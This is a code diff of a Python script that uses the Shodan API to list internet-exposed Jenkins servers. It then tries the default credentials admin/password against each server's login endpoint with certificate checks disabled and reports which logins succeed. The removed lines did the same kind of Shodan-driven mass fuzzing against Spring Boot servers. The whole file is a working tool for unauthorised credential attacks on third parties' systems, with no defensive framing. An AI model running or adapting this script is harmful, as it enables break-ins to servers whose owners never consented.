@@ -1,10 +1,10 @@
-import requests
 import shodan
-import wfuzz
+import requests as rt
+import urllib3
 API_key_shodan = "ENTER_YOUR_SHODAN_API_KEY" #your shodan api key goes here
 api = shodan.Shodan(API_key_shodan)
-out_file = open('spring-boot-server.txt','a')
-query = 'http.favicon.hash:116323821'
+out_file = open('textFiles/jenkins-instances.txt','a')
+query = 'x-jenkins'
 try:
     results = api.search(query)
     print(f"Results found: {results['total']}")
@@ -22,16 +22,17 @@ try:
 except shodan.APIError as e:
     print(f"Error: {e}")
 
-#fuzzing IP
-
-wordlist = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/WebContent/spring-boot.txt').text.split("\n")
-springs = open("spring-boot-servers.txt","r")
-payloads = wfuzz.get_payload(wordlist)
-for spring in springs.readlines():
-    print("Fuzzing - "+spring)
+    
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+urls = open("textFiles/jenkins-instances.txt","r")
+data = {"j_username":"admin","j_password":"password"}
+endpoint = "/j_acegi_security_check"
+for url in urls.readlines():
+    url = url.strip("\n")
+    print("Testing- "+url)
     try:
-        fuzzer = payloads.fuzz(url=spring.rstrip("\n")+"/FUZZ",sc=[200])
-        for result in fuzzer:
-            print(result)
+        req = rt.post(url=url+endpoint,data=data,verify=False)
+        if req.headers.get('location') and not "loginError" in req.headers["location"]:
+            print("login Success")
     except:
         pass
